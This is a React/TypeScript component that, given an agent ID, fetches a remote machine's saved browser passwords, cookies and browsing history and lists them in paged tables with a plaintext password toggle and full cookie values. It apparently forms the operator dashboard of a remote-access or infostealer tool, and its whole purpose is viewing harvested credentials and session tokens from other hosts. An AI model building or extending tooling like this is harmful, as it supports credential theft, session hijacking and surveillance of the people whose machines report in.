import { useCallback, useEffect, useMemo, useRef, useState } from 'react';
import { useTranslation } from 'react-i18next';
import { Button, Skeleton, Tabs, Chip, Accordion } from '@heroui/react';
import { Eye, EyeSlash, ArrowRotateLeft, ChevronDown, Globe } from '@gravity-ui/icons';
import { getBrowser } from '../../api/othersoft';
import type { BrowserPassword, BrowserCookie, BrowserHistory, BrowserDataType } from '../../types/models';

interface BrowserTabProps {
  agentId: string;
}

const PAGE_SIZE = 250;

function usePagedData<T>(agentId: string, type: BrowserDataType) {
  const [items, setItems] = useState<T[]>([]);
  const [total, setTotal] = useState(0);
  const [loading, setLoading] = useState(false);
  const [initialLoading, setInitialLoading] = useState(true);
  const [errors, setErrors] = useState<string[]>([]);
  const offsetRef = useRef(0);
  const hasMoreRef = useRef(true);

  const fetchPage = useCallback(async (reset = false) => {
    if (loading) return;
    const offset = reset ? 0 : offsetRef.current;
    if (!reset && !hasMoreRef.current) return;
    setLoading(true);
    try {
      const res = await getBrowser<T>(agentId, type, offset, PAGE_SIZE);
      setTotal(res.total);
      if (res.errors?.length) setErrors(prev => [...prev, ...res.errors]);
      const newItems = res.items ?? [];
      if (reset) {
        setItems(newItems);
        offsetRef.current = newItems.length;
      } else {
        setItems(prev => [...prev, ...newItems]);
        offsetRef.current = offset + newItems.length;
      }
      hasMoreRef.current = offsetRef.current < res.total;
    } catch {
      setErrors(prev => [...prev, `Failed to fetch ${type}`]);
    } finally {
      setLoading(false);
      setInitialLoading(false);
    }
  }, [agentId, type, loading]);

  const reset = useCallback(() => {
    setItems([]);
    setTotal(0);
    setErrors([]);
    offsetRef.current = 0;
    hasMoreRef.current = true;
    setInitialLoading(true);
  }, []);

  return { items, total, loading, initialLoading, errors, hasMore: hasMoreRef, fetchPage, reset };
}

function ScrollLoader({ loading, hasMore, onLoadMore }: { loading: boolean; hasMore: boolean; onLoadMore: () => void }) {
  const sentinelRef = useRef<HTMLDivElement>(null);
  useEffect(() => {
    if (!hasMore || loading) return;
    const el = sentinelRef.current;
    if (!el) return;
    const obs = new IntersectionObserver(entries => {
      if (entries[0]?.isIntersecting) onLoadMore();
    }, { rootMargin: '200px' });
    obs.observe(el);
    return () => obs.disconnect();
  }, [hasMore, loading, onLoadMore]);
  return <div ref={sentinelRef} className="h-4">{loading && <Skeleton className="h-8 rounded-xl mt-2" />}</div>;
}

export function BrowserTab({ agentId }: BrowserTabProps) {
  const { t } = useTranslation();
  const [subTab, setSubTab] = useState<string>('passwords');
  const [showPasswords, setShowPasswords] = useState<Record<number, boolean>>({});

  const pw = usePagedData<BrowserPassword>(agentId, 'passwords');
  const ck = usePagedData<BrowserCookie>(agentId, 'cookies');
  const hs = usePagedData<BrowserHistory>(agentId, 'history');

  useEffect(() => { pw.fetchPage(true); }, [agentId]);

  const handleTabChange = useCallback((key: string) => {
    setSubTab(key);
    const store = key === 'passwords' ? pw : key === 'cookies' ? ck : hs;
    if (store.initialLoading && store.items.length === 0) store.fetchPage(true);
  }, [pw, ck, hs]);

  const handleRefresh = useCallback(() => {
    const store = subTab === 'passwords' ? pw : subTab === 'cookies' ? ck : hs;
    store.reset();
    setTimeout(() => store.fetchPage(true), 0);
  }, [subTab, pw, ck, hs]);

  const historyByHost = useMemo(() => {
    const map = new Map<string, (BrowserHistory & { key: string })[]>();
    for (let i = 0; i < hs.items.length; i++) {
      const h = hs.items[i]!;
      let host: string;
      try { host = new URL(h.url).hostname; } catch { host = '(other)'; }
      if (!map.has(host)) map.set(host, []);
      map.get(host)!.push({ ...h, key: `${i}` });
    }
    return [...map.entries()].sort((a, b) => b[1].length - a[1].length);
  }, [hs.items]);

  const togglePassword = (idx: number) =>
    setShowPasswords(prev => ({ ...prev, [idx]: !prev[idx] }));

  const currentErrors = subTab === 'passwords' ? pw.errors : subTab === 'cookies' ? ck.errors : hs.errors;

  if (pw.initialLoading && subTab === 'passwords') {
    return (
      <div className="space-y-3">
        <Skeleton className="h-16 rounded-xl" />
        <Skeleton className="h-16 rounded-xl" />
        <Skeleton className="h-16 rounded-xl" />
      </div>
    );
  }

  return (
    <div className="space-y-3">
      <div className="flex items-center justify-between">
        <div className="flex gap-2">
          <Chip variant="soft" color="accent">{t('othersoft.browser.passwords')}: {pw.total}</Chip>
          <Chip variant="soft" color="warning">{t('othersoft.browser.cookies')}: {ck.total}</Chip>
          <Chip variant="soft" color="default">{t('othersoft.browser.history')}: {hs.total}</Chip>
        </div>
        <Button size="sm" variant="ghost" onPress={handleRefresh}>
          <ArrowRotateLeft className="w-4 h-4" />
        </Button>
      </div>

      {currentErrors.length > 0 && (
        <div className="text-danger-500 text-sm">{currentErrors.join('; ')}</div>
      )}

      <Tabs selectedKey={subTab} onSelectionChange={(key) => handleTabChange(String(key))}>
        <Tabs.ListContainer>
          <Tabs.List aria-label="Browser data">
            <Tabs.Tab id="passwords">{t('othersoft.browser.passwords')}<Tabs.Indicator /></Tabs.Tab>
            <Tabs.Tab id="cookies">{t('othersoft.browser.cookies')}<Tabs.Indicator /></Tabs.Tab>
            <Tabs.Tab id="history">{t('othersoft.browser.history')}<Tabs.Indicator /></Tabs.Tab>
          </Tabs.List>
        </Tabs.ListContainer>
        <Tabs.Panel id="passwords">
          {pw.items.length === 0 && !pw.loading ? (
            <div className="text-center text-neutral-500 py-8">{t('othersoft.browser.noData')}</div>
          ) : (
            <div className="overflow-x-auto max-h-[600px] overflow-y-auto">
              <table className="w-full text-sm">
                <thead className="sticky top-0 bg-white dark:bg-neutral-950 z-10">
                  <tr className="border-b border-neutral-200 dark:border-neutral-700">
                    <th className="text-left py-2 px-2">{t('othersoft.browser.source')}</th>
                    <th className="text-left py-2 px-2">URL</th>
                    <th className="text-left py-2 px-2">{t('othersoft.browser.username')}</th>
                    <th className="text-left py-2 px-2">{t('othersoft.browser.password')}</th>
                  </tr>
                </thead>
                <tbody>
                  {pw.items.map((p, idx) => (
                    <tr key={idx} className="border-b border-neutral-100 dark:border-neutral-800 hover:bg-neutral-50 dark:hover:bg-neutral-900">
                      <td className="py-1.5 px-2"><Chip size="sm" variant="soft">{p.browser}</Chip></td>
                      <td className="py-1.5 px-2 max-w-[300px] truncate" title={p.url}>{p.url}</td>
                      <td className="py-1.5 px-2">{p.username}</td>
                      <td className="py-1.5 px-2 flex items-center gap-1">
                        <span className="font-mono">{showPasswords[idx] ? p.password : '••••••••'}</span>
                        <button onClick={() => togglePassword(idx)} className="text-neutral-400 hover:text-neutral-600">
                          {showPasswords[idx] ? <EyeSlash className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
              <ScrollLoader loading={pw.loading} hasMore={pw.hasMore.current} onLoadMore={() => pw.fetchPage()} />
            </div>
          )}
        </Tabs.Panel>

        <Tabs.Panel id="cookies">
          {ck.items.length === 0 && !ck.loading ? (
            <div className="text-center text-neutral-500 py-8">{t('othersoft.browser.noData')}</div>
          ) : (
            <div className="overflow-x-auto max-h-[600px] overflow-y-auto">
              <table className="w-full text-sm">
                <thead className="sticky top-0 bg-white dark:bg-neutral-950 z-10">
                  <tr className="border-b border-neutral-200 dark:border-neutral-700">
                    <th className="text-left py-2 px-2">{t('othersoft.browser.source')}</th>
                    <th className="text-left py-2 px-2">{t('othersoft.browser.domain')}</th>
                    <th className="text-left py-2 px-2">{t('othersoft.browser.cookieName')}</th>
                    <th className="text-left py-2 px-2">{t('othersoft.browser.cookieValue')}</th>
                    <th className="text-left py-2 px-2">{t('othersoft.browser.expires')}</th>
                  </tr>
                </thead>
                <tbody>
                  {ck.items.map((c, idx) => (
                    <tr key={idx} className="border-b border-neutral-100 dark:border-neutral-800 hover:bg-neutral-50 dark:hover:bg-neutral-900">
                      <td className="py-1.5 px-2"><Chip size="sm" variant="soft">{c.browser}</Chip></td>
                      <td className="py-1.5 px-2">{c.host}</td>
                      <td className="py-1.5 px-2">{c.name}</td>
                      <td className="py-1.5 px-2 max-w-[200px] truncate font-mono text-xs" title={c.value}>{c.value}</td>
                      <td className="py-1.5 px-2 text-xs">{c.expires > 0 ? new Date(c.expires / 1000).toLocaleDateString() : '-'}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
              <ScrollLoader loading={ck.loading} hasMore={ck.hasMore.current} onLoadMore={() => ck.fetchPage()} />
            </div>
          )}
        </Tabs.Panel>
        <Tabs.Panel id="history">
          {hs.items.length === 0 && !hs.loading ? (
            <div className="text-center text-neutral-500 py-8">{t('othersoft.browser.noData')}</div>
          ) : (
            <div className="max-h-[600px] overflow-y-auto">
              <Accordion className="w-full">
                {historyByHost.map(([host, items]) => (
                  <Accordion.Item key={host}>
                    <Accordion.Heading>
                      <Accordion.Trigger>
                        <span className="mr-3 size-4 shrink-0 text-muted"><Globe /></span>
                        <span className="flex-1 text-left">{host}</span>
                        <Chip size="sm" variant="soft" className="mr-2">{items.length}</Chip>
                        <Accordion.Indicator><ChevronDown /></Accordion.Indicator>
                      </Accordion.Trigger>
                    </Accordion.Heading>
                    <Accordion.Panel>
                      <Accordion.Body>
                        <table className="w-full text-sm">
                          <thead>
                            <tr className="border-b border-neutral-200 dark:border-neutral-700">
                              <th className="text-left py-1.5 px-2">{t('othersoft.browser.pageTitle')}</th>
                              <th className="text-left py-1.5 px-2">URL</th>
                              <th className="text-left py-1.5 px-2">{t('othersoft.browser.visits')}</th>
                              <th className="text-left py-1.5 px-2">{t('othersoft.browser.source')}</th>
                            </tr>
                          </thead>
                          <tbody>
                            {items.map((h) => (
                              <tr key={h.key} className="border-b border-neutral-100 dark:border-neutral-800">
                                <td className="py-1 px-2 max-w-[250px] truncate" title={h.title}>{h.title || '-'}</td>
                                <td className="py-1 px-2 max-w-[300px] truncate font-mono text-xs" title={h.url}>{h.url}</td>
                                <td className="py-1 px-2">{h.visits}</td>
                                <td className="py-1 px-2"><Chip size="sm" variant="soft">{h.browser}</Chip></td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </Accordion.Body>
                    </Accordion.Panel>
                  </Accordion.Item>
                ))}
              </Accordion>
              <ScrollLoader loading={hs.loading} hasMore={hs.hasMore.current} onLoadMore={() => hs.fetchPage()} />
            </div>
          )}
        </Tabs.Panel>
      </Tabs>
    </div>
  );
}

